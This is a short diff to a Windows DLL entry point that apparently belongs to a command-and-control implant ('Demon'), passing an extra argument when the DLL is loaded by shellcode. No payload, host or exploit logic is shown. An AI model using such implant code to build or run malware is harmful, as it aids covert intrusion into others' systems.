@@ -38,7 +38,7 @@ DLLEXPORT BOOL WINAPI DllMain(
 
 #ifdef SHELLCODE
         /* we dont need to make a new thread since we get loaded by our shellcode */
-        DemonMain( hDllBase );
+        DemonMain( hDllBase, Reserved );
 #else
         /* if we don't compile for the shellcode then start a new thread.
          * why? because if not then we get an ERROR_INVALID_STATE from WinHttpSendRequest
